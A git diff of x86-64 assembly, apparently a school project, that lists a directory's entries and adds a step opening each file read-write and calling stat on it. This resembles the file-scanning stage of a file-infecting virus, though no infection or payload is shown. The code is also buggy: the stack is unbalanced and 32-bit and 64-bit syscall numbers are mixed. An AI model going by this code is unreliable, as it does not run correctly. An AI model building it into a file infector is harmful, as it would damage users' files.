@@ -74,7 +74,7 @@ _start:
   push rbp
   mov rbp, rsp
 
-  sub rsp, 0x430 ; char buf[1024]
+  sub rsp, 0x2710;0x430 ; char buf[1024]
   mov rcx, 0 ; O_RDONLY
   lea rbx, [dot] ; "."
   mov rax, 5 ; open syscall
@@ -109,13 +109,30 @@ _start:
     add bx, cx ; rbx += rcx
     mov [rbp - 0x41c], rbx ; store rbx in num
 
-    push rax
     lea rax, [rax + linux_dirent.d_name]
+    mov rdi, rax
     call ft_write
-    pop rax
-    mov rbx, [rbp - 0x41c]
-    cmp rbx, [rbp - 0x424] ; compare num with res
-    jl .while
+    pop rdi
+
+    .open_file: ; try to open file, and if we succeeded then stat it
+      mov rax, 2 ; open syscall
+      ; rdi already holds d_name
+      mov rsi, 2; O_RDWR / Read and Write
+      syscall
+
+      cmp rax, 0
+      jl .next_file
+      lea r15, [rbp - 0x2710]
+      .stat:
+        mov rax, 4 ; stat syscall
+        ; rdi already has d_name
+        mov rsi, r15 ; statbuf struct
+        syscall
+
+    .next_file
+      mov rbx, [rbp - 0x41c]
+      cmp rbx, [rbp - 0x424] ; compare num with res
+      jl .while
 
   .end:
     mov ebx, 0 ; exitcode 0
